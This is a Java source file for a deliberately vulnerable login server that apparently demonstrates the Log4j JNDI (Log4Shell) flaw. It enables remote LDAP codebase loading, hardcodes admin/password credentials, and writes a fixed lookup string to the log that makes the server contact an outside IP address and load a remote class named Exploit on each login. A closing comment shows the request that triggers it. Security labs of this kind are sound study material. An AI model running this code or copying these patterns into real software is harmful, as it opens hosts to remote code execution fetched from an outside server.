import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;

public class VulnerableApp {
    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

    public static void main(String[] args) throws IOException {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);
        server.createContext("/login", new LoginHandler());
        server.setExecutor(Executors.newFixedThreadPool(10));
        server.start();

        System.out.println("Server started on port 8080");
    }

    static class LoginHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            if ("POST".equals(exchange.getRequestMethod())) {
                String requestBody = readRequestBody(exchange.getRequestBody());
                String[] params = requestBody.split("&");
                String username = "";
                String password = "";
                for (String param : params) {
                    String[] keyValue = param.split("=");
                    if (keyValue.length == 2) {
                        if ("username".equals(keyValue[0])) {
                            username = keyValue[1];
                        } else if ("password".equals(keyValue[0])) {
                            password = keyValue[1];
                        }
                    }
                }

                boolean loginSuccess = login(username, password);
                String response = loginSuccess ? "Login Successful!" : "Login Failed!";

                exchange.sendResponseHeaders(200, response.length());
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(response.getBytes());
                }
            } else {
                String response = "Method Not Allowed";
                exchange.sendResponseHeaders(405, response.length());
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(response.getBytes());
                }
            }
        }

        private boolean login(String username, String password) {
            logger.error("Login attempt: ${jndi:ldap://35.229.194.59:1389/Exploit}" + username);
            return "admin".equals(username) && "password".equals(password);
        }

        private String readRequestBody(InputStream is) throws IOException {
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] data = new byte[1024];
            int bytesRead;
            while ((bytesRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, bytesRead);
            }
            return new String(buffer.toByteArray(), StandardCharsets.UTF_8);
        }
    }
}

// wget -Method Post -Uri http://localhost:8080/login -Body "username=admin&password=password"